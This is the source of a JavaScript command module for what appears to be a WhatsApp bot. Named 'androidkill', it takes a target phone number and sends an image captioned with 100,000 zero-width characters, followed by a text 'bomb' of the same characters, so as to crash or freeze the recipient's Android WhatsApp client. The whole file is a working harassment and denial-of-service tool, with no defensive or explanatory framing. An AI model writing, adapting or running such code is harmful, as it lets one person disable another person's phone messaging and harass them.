const fs = require('fs');
const path = require('path');

module.exports = {
  name: 'androidkill',
  alias: [],
  description: 'Crash or freeze Android WhatsApp client by sending media + invisible overload',
  category: 'bug',

  async run(bot, msg, args, platform) {
    const target = args[0];
    if (!target) {
      return bot.sendMessage(msg.chat.id, '⚠️ Please provide a target number.\n\nExample:\n.androidkill 233XXXXXXXXX');
    }

    const jid = `${target}@s.whatsapp.net`;
    const invisible = "‍".repeat(100000); // 100K zero-width characters
    const mediaPath = path.join(__dirname, '../media/bug.jpg');

    try {
      const mediaBuffer = fs.readFileSync(mediaPath);

      // Send image with invisible overload
      await bot.sendMessage(jid, {
        image: mediaBuffer,
        caption: invisible
      });

      // Follow-up text bomb
      await bot.sendMessage(jid, invisible + '\n\n⚠️');

      await bot.sendMessage(msg.chat.id, `✅ Android kill bomb sent to ${target}`);
    } catch (e) {
      await bot.sendMessage(msg.chat.id, `❌ Failed to deliver androidkill payload.\n\n${e.message}`);
    }
  }
};
